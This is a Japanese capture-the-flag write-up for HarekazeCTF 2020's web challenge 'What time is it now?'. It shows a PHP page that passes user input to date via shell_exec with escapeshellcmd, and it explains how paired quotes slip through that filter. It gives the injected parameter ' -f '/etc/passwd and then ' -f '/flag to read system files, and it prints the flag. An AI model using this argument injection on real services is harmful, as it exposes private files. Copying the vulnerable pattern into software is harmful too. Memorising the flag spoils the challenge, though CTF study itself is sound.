# What time is it now?:Web:123pts
そうねだいたいね…  
[http://harekaze2020.317de643c0ae425482fd.japaneast.aksapp.io/what-time-is-it-now/](http://harekaze2020.317de643c0ae425482fd.japaneast.aksapp.io/what-time-is-it-now/)  

---

It's about ...  
[http://harekaze2020.317de643c0ae425482fd.japaneast.aksapp.io/what-time-is-it-now/](http://harekaze2020.317de643c0ae425482fd.japaneast.aksapp.io/what-time-is-it-now/)  

---

Attachments: [what-time-is-it-now.zip](what-time-is-it-now.zip)  

# Solution
URLにアクセスすると時間を表示してくれるサイトのようだ。  
日付とUNIX時間にも表示を変更できる。  
What time is it now?  
[site1.png](site/site1.png)  
ソースを見ることもできるようなので(配布されてもいるが)、見ると以下の部分が時間を表示しているようだ。  
```html
<?php
if (isset($_GET['source'])) {
  highlight_file(__FILE__);
  exit;
}

$format = isset($_REQUEST['format']) ? (string)$_REQUEST['format'] : '%H:%M:%S';
$result = shell_exec("date '+" . escapeshellcmd($format) . "' 2>&1");
?>
~~~
          <h1 class="jumbotron-heading"><span class="text-muted">It's</span> <?= isset($result) ? $result : '?' ?><span class="text-muted">.</span></h1>
          <p>
            <a href="?format=%H:%M:%S" class="btn btn-outline-secondary">What time is it now?</a>
            <a href="?format=%Y-%m-%d" class="btn btn-outline-secondary">What is the date today?</a>
            <a href="?format=%s" class="btn btn-outline-secondary">What time is it now in UNIX time?</a>
          </p>
~~~
```
`shell_exec`といういかにもな関数が呼ばれているが、`escapeshellcmd`でサニタイズされているようだ。  
これでは特殊記号が使えないので、パイプでつなぐことや外部にファイルを送信することはできない。  
```bash
$ php -a
php > echo escapeshellcmd("$'();<>\\");
\$\'\(\)\;\<\>\\
```
ところが`escapeshellcmd`はとんでもない関数で、シングルクオートやダブルクオートが対応している場合サニタイズされない。  
```bash
$ php -a
php > echo escapeshellcmd("''");
''
php > echo escapeshellcmd('""');
""
```
これによってdateのシングルクオートを閉じることができた。  
オプションなどはつけられるが、ファイルの読み取りなどはできそうにない。  
dateコマンドのヘルプを表示してみる。  
```bash
$ date --help
使用法: date [OPTION]... [+FORMAT]
または: date [-u|--utc|--universal] [MMDDhhmm[[CC]YY][.ss]]
Display the current time in the given FORMAT, or set the system date.

Mandatory arguments to long options are mandatory for short options too.
  -d, --date=STRING          display time described by STRING, not 'now'
      --debug                annotate the parsed date,
                              and warn about questionable usage to stderr
  -f, --file=DATEFILE        like --date; once for each line of DATEFILE
  -I[FMT], --iso-8601[=FMT]  output date/time in ISO 8601 format.
                               FMT='date' for date only (the default),
                               'hours', 'minutes', 'seconds', or 'ns'
                               for date and time to the indicated precision.
                               Example: 2006-08-14T02:34:56-06:00
  -R, --rfc-email            output date and time in RFC 5322 format.
                               Example: Mon, 14 Aug 2006 02:34:56 -0600
      --rfc-3339=FMT         output date/time in RFC 3339 format.
                               FMT='date', 'seconds', or 'ns'
                               for date and time to the indicated precision.
                               Example: 2006-08-14 02:34:56-06:00
  -r, --reference=FILE       display the last modification time of FILE
  -s, --set=STRING           set time described by STRING
  -u, --utc, --universal     print or set Coordinated Universal Time (UTC)
      --help     この使い方を表示して終了する
      --version  バージョン情報を表示して終了する
~~~
```
`-f`でファイルが読み取れるようである。  
`' -f '/etc/passwd`をクエリパラメータにセットしてみると、ファイルが読み取れた。  
What time is it now?(/etc/passwd)  
[site2.png](site/site2.png)  
配布ファイル内のDockerfileに以下の記述がある。  
```text:Dockerfile
FROM php:7.4-apache

ADD public/index.php /var/www/html/

RUN chmod -R 755 /var/www
RUN chown root:root /var/www

RUN echo "HarekazeCTF{<censored>}" > "/flag"
RUN chmod -R 755 /flag*
```
/flagを読み取ればよいようだ。  
`' -f '/flag`をクエリパラメータにセットする。  
flag  
[flag.png](site/flag.png)  
flagが読み取れた。  

## HarekazeCTF{1t's_7pm_1n_t0ky0}